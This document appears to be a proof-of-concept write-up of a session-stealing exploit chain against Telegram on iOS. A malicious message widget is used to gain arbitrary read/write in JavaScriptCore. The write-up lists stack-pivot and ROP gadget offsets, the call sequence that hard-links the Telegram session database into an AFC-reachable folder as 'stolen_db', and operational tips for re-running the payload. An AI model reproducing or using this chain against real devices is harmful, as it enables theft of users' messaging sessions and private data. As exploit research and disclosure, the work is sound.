# iOS 6s — session stealer PoC (2026-11-05)

Target: iPhone 6s, iOS 15.8.8, Telegram 13.2 (36535), widget `message-widget`.
Goal: demonstrate session-data access with the RCE primitive, without a shell.
Result: **hard link of the Postbox session DB inside the app's Documents**.

## Artifact

Source (AppGroup, untouched):
```
115809 -rw-r--r-- 2 mobile mobile 47173632 .../AppGroup/00000000-0000-0000-0000-000000000000/
telegram-data/account-<ACCOUNT_ID>/postbox/db/db_sqlite
```

Exfil path (app container Documents):
```
115809 -rw-r--r-- 2 mobile mobile 47173632 /private/var/mobile/Containers/Data/Application/
00000000-0000-0000-0000-000000000000/Documents/stolen_db
```

- Same inode and link count 2 -> `link(db, Documents/stolen_db)`; no byte copy,
  no modification of the source DB.
- `head -c 16` of the link: `SQLite format 3\0`.
- The file is inside the app container, so it can be pulled with AFC/house_arrest
  (or SSH on this jailbroken device). The AppGroup itself is not AFC-visible.

## Chain

- [1827] arbitrary R/W, base/free decode as in `ios_rce_proof_20261105.md`.
- Pivot: `JavaScriptCore+0x3a0ee8` `mov sp,x0; ret`; `PIVOT2 = libcFree - 0x66cccfc`.
- Leak a fresh `Uint8Array(2048)` data pointer with a **per-run random magic**
  (a fixed magic can match a stale buffer from a previous widget run).
- Data in the large Uint8Array block: `SRC`/`DST` paths, structs.
- Gadgets `G_CALL 0x3292c`, `G_LOAD 0x172d96c`, `G_X0 0x628a2c`.
- Call `link(src, dst)` (`libcFree + 0x296de230`), then `pthread_exit` (`+0x4a21a474`).
- Arm order: precompute `rt+0x10/0x20/0x30/0x40` and HUGE before the huge
  malloc_size write; no BigInt arithmetic after it; drop the TRIG alias last.

## Operational note

`pthread_exit` terminates the widget thread. After a stealer execution the
current Telegram process may render subsequent widget messages as empty cells;
**relaunch Telegram to get a fresh widget thread** before the next payload.
On this run the app later crashed in an AudioToolbox thread (SIGSEGV in a
heap address), while the linked DB and the Telegram data stayed intact;
the crash is not in the widget/js_free path.

## Artifacts

- Endgame: `lab/ios_port/ios_steal_endgame.js`
- Widget: `/tmp/opencode/ios_widget_steal2.html` (8,504 B raw, 3,880 B zlib9)
- Proof message: bot API 5661 (deleted after the PoC)
